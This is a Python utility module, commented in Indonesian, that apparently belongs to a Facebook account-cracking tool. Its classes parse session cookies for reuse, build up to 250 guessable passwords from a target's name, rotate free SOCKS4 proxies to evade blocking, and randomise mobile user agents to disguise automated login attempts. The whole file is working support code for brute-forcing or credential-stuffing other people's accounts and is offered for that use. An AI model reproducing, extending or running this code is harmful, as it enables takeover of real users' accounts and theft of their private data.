"""
Utilitas untuk Facebook Crack
Berisi password generator, proxy manager, user agent generator, dan cookie parser
"""

import random
import requests
import os
from typing import List, Dict


class CookieParser:
    """
    Shared utility untuk parse cookie string menjadi dict
    CRITICAL: Digunakan oleh semua modul untuk konsistensi
    """
    
    @staticmethod
    def parse(cookie_str: str) -> Dict[str, str]:
        """
        Parse cookie string menjadi dict untuk requests
        
        Method ini menjadi SINGLE SOURCE OF TRUTH untuk cookie parsing.
        Semua modul (auth.py, dumper.py, cracker.py, integration) HARUS pakai ini.
        
        Args:
            cookie_str: Cookie string dari browser (e.g., "c_user=123; xs=abc; datr=xyz")
            
        Returns:
            Dict cookie siap pakai untuk requests
            
        Examples:
            >>> cookie = "c_user=100012345678; xs=test123; datr=abcd"
            >>> CookieParser.parse(cookie)
            {'c_user': '100012345678', 'xs': 'test123', 'datr': 'abcd'}
        """
        cookies = {}
        
        if not cookie_str or not isinstance(cookie_str, str):
            return cookies
        
        try:
            for item in cookie_str.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookies[key.strip()] = value.strip()
        except Exception:
            pass
        
        return cookies
    
    @staticmethod
    def validate(cookies: Dict[str, str]) -> tuple[bool, str]:
        """
        Validasi apakah cookie dict memiliki field yang diperlukan
        
        Args:
            cookies: Dict cookies hasil parsing
            
        Returns:
            Tuple (valid, error_message)
        """
        required_fields = ['c_user', 'xs']
        missing = [field for field in required_fields if field not in cookies]
        
        if missing:
            return (False, f"Cookie tidak lengkap. Field yang hilang: {', '.join(missing)}")
        
        if not cookies['c_user'].isdigit():
            return (False, "Field c_user harus berupa angka (user ID)")
        
        return (True, "Cookie valid")


class PasswordGenerator:
    """Generator password untuk cracking - UPGRADED dengan 250+ kombinasi password SUPER GACOR!"""
    
    @staticmethod
    def generate(name: str) -> List[str]:
        """
        Generate list password dari nama dengan 250+ kombinasi SUPER GACOR!
        OPTIMIZED untuk Indonesia + Global patterns
        
        Args:
            name: Nama target
            
        Returns:
            List password yang akan dicoba (250+ kombinasi unik)
        """
        name = name.lower().strip()
        first_name = name.split(" ")[0] if " " in name else name
        last_name = name.split(" ")[-1] if " " in name and len(name.split(" ")) > 1 else ""
        full_name = name.replace(" ", "")
        
        passwords = []
        
        if len(first_name) >= 3:
            passwords.extend([
                first_name,
                first_name + "123",
                first_name + "1234",
                first_name + "12345",
                first_name + "123456",
                first_name + "1234567",
                first_name + "12345678",
                first_name + "123456789",
                first_name + "321",
                first_name + "123321",
                first_name + "@123",
                first_name + "@12345",
                first_name + "@123456",
                first_name + "@@",
                first_name + "@@@",
                first_name + "!!",
                first_name + "!!!",
                first_name + "###",
                first_name + "***",
                first_name + "...",
                first_name + "@@@123",
                first_name + "!!!123",
                first_name + "786",
                first_name + "007",
                first_name + "69",
                first_name + "88",
                first_name + "777",
                first_name + "999",
                first_name + "2020",
                first_name + "2021",
                first_name + "2022",
                first_name + "2023",
                first_name + "2024",
                first_name + "2025",
                first_name + "2019",
                first_name + "2018",
                first_name + "2017",
                first_name + "2016",
                first_name + "2015",
                first_name + "2010",
                first_name + "2000",
                first_name + "1999",
                first_name + "1998",
                first_name + "1997",
                first_name + "1996",
                first_name + "1995",
                first_name + "1994",
                first_name + "1993",
                first_name + "1992",
                first_name + "1991",
                first_name + "1990",
                first_name + "99",
                first_name + "98",
                first_name + "97",
                first_name + "96",
                first_name + "95",
                first_name + "01",
                first_name + "02",
                first_name + "03",
                first_name + "04",
                first_name + "05",
                first_name + "06",
                first_name + "07",
                first_name + "08",
                first_name + "09",
                first_name + "10",
                first_name + "11",
                first_name + "12",
                "123" + first_name,
                "12345" + first_name,
                "123456" + first_name,
                first_name + "sayang",
                first_name + "cinta",
                first_name + "love",
                first_name + "ganteng",
                first_name + "cantik",
                first_name + "aja",
                first_name + "ajah",
                first_name + "doang",
                first_name + "banget",
                first_name + "bang",
                first_name + "bro",
                first_name + "sis",
                first_name + "kun",
                first_name + "chan",
                first_name + "san",
                first_name + "gaming",
                first_name + "gamer",
                first_name + "yt",
                first_name + "ff",
                first_name + "ml",
                first_name + "squad",
                first_name.capitalize(),
                first_name.upper(),
                first_name + first_name,
                first_name[:3] + "123",
                first_name[:3] + "12345",
                first_name[:4] + "123",
                first_name[:4] + "12345",
            ])
        
        if last_name and len(last_name) >= 3:
            passwords.extend([
                last_name,
                last_name + "123",
                last_name + "1234",
                last_name + "12345",
                last_name + "123456",
                last_name + "321",
                last_name + "2024",
                last_name + "2025",
                last_name + "2023",
                last_name + "2022",
                last_name + "2000",
                last_name + "1999",
                last_name.capitalize(),
                last_name.upper(),
                first_name + last_name,
                last_name + first_name,
                first_name + last_name + "123",
                last_name + first_name + "123",
            ])
        
        if len(full_name) >= 6:
            passwords.extend([
                full_name,
                full_name + "123",
                full_name + "1234",
                full_name + "12345",
                full_name + "321",
                full_name + "2024",
                full_name + "2025",
                full_name.capitalize(),
            ])
        
        passwords.extend([
            "bismillah",
            "bismillah123",
            "bismillah1",
            "bismillah12",
            "bismillah2024",
            "alhamdulillah",
            "subhanallah",
            "mashaallah",
            "allahuakbar",
            "assalamualaikum",
            "sayangku",
            "sayangku123",
            "sayangku1",
            "sayangkamu",
            "sayangkamu123",
            "sayang",
            "sayang123",
            "sayang1234",
            "sayang12345",
            "sayangmu",
            "akusayang",
            "akusayangkamu",
            "kucingku",
            "anjingku",
            "anjing",
            "kucing",
            "indonesia",
            "indonesia123",
            "indonesia1945",
            "indonesiaku",
            "indonesia2024",
            "nusantara",
            "merdeka",
            "merdeka123",
            "garuda",
            "jakarta",
            "surabaya",
            "bandung",
            "yogyakarta",
            "bali",
            "123456",
            "1234567",
            "12345678",
            "123456789",
            "1234567890",
            "0123456789",
            "654321",
            "112233",
            "111111",
            "000000",
            "123123",
            "123321",
            "987654321",
            "password",
            "password123",
            "password1",
            "password12",
            "pass123",
            "pass1234",
            "qwerty",
            "qwerty123",
            "qwerty12345",
            "qwerty1",
            "asdfgh",
            "asdfghjkl",
            "zxcvbn",
            "zxcvbnm",
            "123qwe",
            "qwe123",
            "abc123",
            "abc12345",
            "admin",
            "admin123",
            "admin1234",
            "administrator",
            "welcome",
            "welcome123",
            "welcome1",
            "iloveyou",
            "iloveu",
            "iloveyou123",
            "loveyou",
            "loveyou123",
            "fuckyou",
            "fuckyou123",
            "monkey",
            "monkey123",
            "dragon",
            "dragon123",
            "master",
            "master123",
            "killer",
            "killer123",
            "superman",
            "spiderman",
            "batman",
            "ironman",
            "naruto",
            "naruto123",
            "sasuke",
            "sakura",
            "kakashi",
            "goku",
            "vegeta",
            "luffy",
            "onepiece",
            "gaming",
            "gaming123",
            "gamer",
            "gamer123",
            "legend",
            "legend123",
            "legendary",
            "pro",
            "pro123",
            "noob",
            "noob123",
            "anjay",
            "anjay123",
            "anjir",
            "anjrit",
            "kontol",
            "kontol123",
            "memek",
            "bangsat",
            "jancok",
            "asu",
            "tolol",
            "goblok",
            "freefire",
            "freefire123",
            "mobilelegends",
            "mobilelegend",
            "pubg",
            "pubg123",
            "valorant",
            "minecraft",
            "roblox",
        ])
        
        seen = set()
        unique_passwords = []
        for pwd in passwords:
            if pwd and pwd not in seen and len(pwd) >= 3:
                seen.add(pwd)
                unique_passwords.append(pwd)
        
        return unique_passwords[:250]


class ProxyManager:
    """Manager untuk proxy"""
    
    def __init__(self):
        self.proxies = []
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxy dari file atau API"""
        try:
            if os.path.exists(".prox.txt"):
                with open(".prox.txt", "r") as f:
                    self.proxies = f.read().splitlines()
            
            if not self.proxies:
                prox = requests.get(
                    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all",
                    timeout=10
                ).text
                with open(".prox.txt", "w") as f:
                    f.write(prox)
                self.proxies = prox.splitlines()
        except:
            self.proxies = []
    
    def get_proxy(self) -> dict:
        """
        Dapatkan random proxy
        
        Returns:
            Dict proxy untuk requests
        """
        if not self.proxies:
            return {}
        
        proxy = random.choice(self.proxies)
        return {
            'http': f'socks4://{proxy}',
            'https': f'socks4://{proxy}'
        }


class UserAgentGenerator:
    """Generator User Agent"""
    
    @staticmethod
    def get_random() -> str:
        """
        Dapatkan random user agent
        
        Returns:
            User agent string
        """
        user_agents = []
        
        for _ in range(100):
            android = random.choice(['10', '11', '12', '13'])
            chrome = random.randrange(80, 120)
            build = random.randrange(4200, 4900)
            
            ua = f'Mozilla/5.0 (Linux; Android {android}; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome}.0.{build}.{random.randrange(40, 150)} Mobile Safari/537.36'
            user_agents.append(ua)
        
        return random.choice(user_agents)
